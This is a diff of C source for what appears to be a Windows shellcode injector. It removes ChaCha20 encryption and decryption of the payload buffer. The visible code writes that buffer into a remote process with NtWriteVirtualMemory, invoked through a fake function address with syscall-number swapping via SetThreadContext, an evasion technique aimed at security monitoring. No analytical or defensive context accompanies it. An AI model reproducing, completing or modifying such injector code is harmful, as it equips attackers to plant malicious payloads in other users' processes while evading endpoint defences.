@@ -1,6 +1,5 @@
 #include "Utils.h"
 #include "Syscalls.h"
-#include "ChaCha20.h"
 #include <windows.h>
 #include <stdio.h>
 
@@ -85,9 +84,6 @@ static bool Init()
 
 int main()
 {
-	struct chacha20_context ctx;
-	chacha20_init_context(&ctx, k, n, 0);
-
 	HANDLE hProcess = NULL, hRemoteThread = NULL;
 	PVOID pRemoteAddr = NULL;
 	DWORD dwTgtProcId, oldProtect;
@@ -143,8 +139,6 @@ int main()
 		SetThreadContext((HANDLE)-2, &threadContext);
 		newSSN = wvmSSN;
 
-		chacha20_xor(&ctx, buf, sizeof(buf));
-
 		if (((NtWriteVirtualMemory)pFakeFunctionAddr)(hProcess, pRemoteAddr, buf, sizeof(buf), NULL) != STATUS_SUCCESS)
 		{
 			print_debug("[-] NtWriteVirtualMemory failed\n");
@@ -152,8 +146,6 @@ int main()
 			goto Exit;
 		}
 		print_debug("[+] written %lld bytes\n", bytesWritten);
-
-		chacha20_xor(&ctx, buf, sizeof(buf));
 	}
 	else
 	{
